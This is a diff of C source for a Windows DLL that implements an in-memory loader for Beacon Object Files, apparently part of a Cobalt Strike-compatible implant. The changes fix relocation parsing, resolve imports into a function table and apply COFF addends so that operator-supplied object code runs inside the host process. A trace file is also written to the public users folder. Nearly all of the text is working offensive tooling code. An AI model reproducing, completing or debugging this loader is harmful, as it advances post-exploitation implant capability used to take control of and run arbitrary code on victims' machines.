@@ -43,7 +43,7 @@ typedef struct {
 
 /* stage trace (C-19 debugging): append-only file log, best effort */
 static void eclog(const char * msg) {
-	HANDLE f = CreateFileA("C:\Users\Public\asyncdll_trace.txt", FILE_APPEND_DATA, 0, NULL,
+	HANDLE f = CreateFileA("C:\\Users\\Public\\asyncdll_trace.txt", FILE_APPEND_DATA, 0, NULL,
 	                       OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (f == INVALID_HANDLE_VALUE) return;
 	WriteFile(f, msg, (DWORD)strlen(msg), NULL, NULL);
@@ -225,6 +225,21 @@ static void * g_ftable[43];
 /* ---------------- mini wire-object loader ---------------- */
 enum { SEC_TEXT = 0, SEC_RDATA, SEC_DATA, SEC_BSS, SEC_XDATA, SEC_PDATA, SEC_MAX };
 
+/* relocation record - LITTLE-ENDIAN native struct (bof_extract
+ * OBJExecutable.getRelocations packs every numeric field with
+ * Packer.little(); only the 1027 module/function lenstrs switch to big()).
+ * The beacon's own loader casts the bytes as this native struct
+ * (boff.cpp OBJ_RELOC via data_ptr) - mirror that exactly. The old BE
+ * reads garbled every field, every reloc was skipped, and the BOF
+ * executed with unresolved call sites (call rax -> garbage, c0000005). */
+typedef struct {
+	int   section;
+	short type;
+	short symbol;
+	int   offset;
+	int   offset_in_section;
+} OBJ_RELOC_LE;
+
 static int run_bof(char * wire, int wireLen) {
 	DATAP d, d2;
 	char * secs[SEC_MAX];
@@ -297,12 +312,17 @@ static int run_bof(char * wire, int wireLen) {
 		DATAP r;
 		r.b = relocs; r.n = relocLen;
 		while (r.n >= 16) {
-			int siteSec = dp_int(&r);
-			int rtype = (unsigned short)dp_short(&r);
-			int symbol = (unsigned short)dp_short(&r);
-			int offset = dp_int(&r);
-			int offInSec = dp_int(&r);
+			OBJ_RELOC_LE rec;
+			int siteSec, rtype, symbol, offset, offInSec;
 			char * siteBase = NULL, * target = NULL;
+
+			memcpy(&rec, r.b, sizeof(rec));
+			r.b += sizeof(rec); r.n -= sizeof(rec);
+			siteSec  = rec.section;
+			rtype    = rec.type;
+			symbol   = rec.symbol;
+			offset   = rec.offset;
+			offInSec = rec.offset_in_section;
 
 			if (symbol == 1028) break;
 			switch (siteSec) {
@@ -321,6 +341,8 @@ static int run_bof(char * wire, int wireLen) {
 				char * fn = dp_lenstr_be(&r, &fl);
 				char modbuf[64], fnbuf[160];
 				HMODULE hm; FARPROC fp;
+				int s;
+				char * slot = NULL;
 				if (!mod || !fn) break;
 				if (ml >= (int)sizeof(modbuf)) ml = sizeof(modbuf) - 1;
 				memcpy(modbuf, mod, ml); modbuf[ml] = 0;
@@ -330,11 +352,18 @@ static int run_bof(char * wire, int wireLen) {
 				if (fl > 0 && fnbuf[fl - 1] == 0) fl--; fnbuf[fl] = 0;
 				hm = LoadLibraryA(modbuf);
 				fp = hm ? GetProcAddress(hm, fnbuf) : NULL;
-				target = (char *)fp;
-				if (!target) {
+				if (!fp) {
 					memset(siteBase + offset, 0, 8);
 					continue;
 				}
+				/* beacon function_slot semantics: install the pointer into a
+				 * free slot and point the site AT the slot - [rip+X] loads
+				 * the slot content (the fn ptr), not the fn body bytes */
+				for (s = 0; s < 43; s++) {
+					if (g_ftable[s] == NULL) { g_ftable[s] = fp; slot = (char *)(g_ftable + s); break; }
+				}
+				if (slot == NULL) break;
+				target = slot;
 			} else if (symbol >= 1024 && symbol <= 1031) {
 				char * tb = NULL;
 				switch (symbol) {
@@ -348,25 +377,35 @@ static int run_bof(char * wire, int wireLen) {
 				if (!tb) continue;
 				target = tb + offInSec;
 			} else if (symbol < 43) {
-				target = (char *)g_ftable[symbol];
-				if (!target) {
-					memset(siteBase + offset, 0, 8);
-					continue;
-				}
+				/* beacon semantics: the site points AT the ftable slot so a
+				 * mov rax,[rip+X] loads the fn pointer, not the fn body */
+				target = (char *)(g_ftable + symbol);
 			} else {
 				continue;
 			}
 
+			/* beacon process_reloc semantics: the site's existing bytes are
+			 * the linker addend - read and add them (COFF section-symbol
+			 * relocs carry the in-section offset as the site addend). */
 			if (rtype == 1) { /* ADDR64 */
-				*(long long *)(siteBase + offset) = (long long)(size_t)target;
+				long long addend;
+				memcpy(&addend, siteBase + offset, 8);
+				*(long long *)(siteBase + offset) = (long long)(size_t)target + addend;
 			} else if (rtype == 2 || rtype == 6) { /* ADDR32 */
-				*(int *)(siteBase + offset) = (int)(size_t)target;
-			} else if (rtype == 3) { /* ADDR32NB section-relative */
+				int addend;
+				memcpy(&addend, siteBase + offset, 4);
+				*(int *)(siteBase + offset) = (int)(size_t)target + addend;
+			} else if (rtype == 3) { /* ADDR32NB: sections live in separate
+			    allocations here, so a true RVA is not expressible; write
+			    the in-section offset as a benign placeholder (the beacon
+			    computes it against its contiguous mapping base) */
 				*(int *)(siteBase + offset) = offInSec;
-			} else { /* REL32 family (20 / 4..9) + unknown default */
+			} else { /* REL32 family (4..9) + unknown default */
 				int k = (rtype >= 4 && rtype <= 9) ? (rtype - 4) : 0;
 				long long next = (long long)(size_t)(siteBase + offset + 4 + k);
-				*(int *)(siteBase + offset) = (int)((long long)(size_t)target - next);
+				int addend;
+				memcpy(&addend, siteBase + offset, 4);
+				*(int *)(siteBase + offset) = (int)((long long)(size_t)target + addend - next);
 			}
 		}
 	}
@@ -483,7 +522,7 @@ static void run_async(LPVOID raw) {
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 	{
-		HANDLE f = CreateFileA("C:\Users\Public\asyncdll_trace.txt", FILE_APPEND_DATA, 0, NULL,
+		HANDLE f = CreateFileA("C:\\Users\\Public\\asyncdll_trace.txt", FILE_APPEND_DATA, 0, NULL,
 		                       OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (f != INVALID_HANDLE_VALUE) {
 			char b2[64];
